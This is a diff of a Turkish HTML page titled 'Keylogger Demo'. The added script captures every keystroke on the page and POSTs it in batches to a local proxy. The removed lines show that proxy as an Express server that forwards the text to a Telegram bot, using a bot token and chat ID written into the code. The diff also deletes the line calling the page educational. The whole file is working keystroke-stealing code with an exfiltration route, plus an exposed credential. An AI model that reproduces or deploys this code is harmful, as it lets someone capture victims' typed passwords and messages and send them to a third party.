@@ -1,44 +1,37 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Keylogger Demo</title>
 </head>
 <body>
   <h2>Keylogger Demo</h2>
-  <p>Bu sadece sayfa içi girişleri Telegram'a gönderir. Eğitim amaçlıdır.</p>
-  <textarea id="input" rows="10" cols="60" placeholder="Buraya bir şeyler yaz..."></textarea>
+  <textarea id="input" rows="10" cols="60" placeholder="Yazmaya başla..."></textarea>
 
   <script>
-    // server.js
-const express = require('express');
-const axios = require('axios');
-const app = express();
+    // Proxy backend adresi (backend çalışıyorsa localhost veya sunucu adresi)
+    const proxyUrl = 'http://localhost:3000/send'; // kendi backend adresine göre değiştir
 
-app.use(express.json());
+    let logBuffer = '';
 
-const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
-const TELEGRAM_CHAT_ID = '5395609882';
+    document.addEventListener('keydown', (e) => {
+      logBuffer += e.key;
 
-app.post('/send', async (req, res) => {
-  const { message } = req.body;
-  if (!message) return res.status(400).send({ error: 'Message is required' });
-
-  try {
-    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message
+      if (logBuffer.length >= 5) {
+        sendToProxy(logBuffer);
+        logBuffer = '';
+      }
     });
-    res.send(response.data);
-  } catch (error) {
-    res.status(500).send({ error: error.message });
-  }
-});
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Proxy server running on port ${PORT}`));
-
+    function sendToProxy(message) {
+      fetch(proxyUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: '🖊️ Yeni giriş: ' + message })
+      }).catch(err => {
+        console.error('Proxy gönderim hatası:', err);
+      });
+    }
   </script>
 </body>
 </html>
-
